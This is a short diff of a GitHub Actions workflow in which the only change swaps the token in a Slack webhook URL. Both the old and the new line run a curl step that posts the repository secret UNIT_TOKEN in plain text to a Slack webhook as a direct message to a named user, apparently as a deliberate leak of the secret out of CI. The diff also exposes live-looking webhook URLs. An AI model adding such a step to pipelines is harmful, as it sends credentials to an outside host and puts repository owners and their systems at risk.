@@ -10,7 +10,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: |
-          curl -X POST --data-urlencode "payload={\"channel\": \"@asaf.levy\", \"username\": \"webhookbot\", \"text\": \"token: ${{ secrets.UNIT_TOKEN }}\", \"icon_emoji\": \":ghost:\"}" https://hooks.slack.com/services/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
+          curl -X POST --data-urlencode "payload={\"channel\": \"@asaf.levy\", \"username\": \"webhookbot\", \"text\": \"token: ${{ secrets.UNIT_TOKEN }}\", \"icon_emoji\": \":ghost:\"}" https://hooks.slack.com/services/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
 
       # - run: |
       #     touch .env
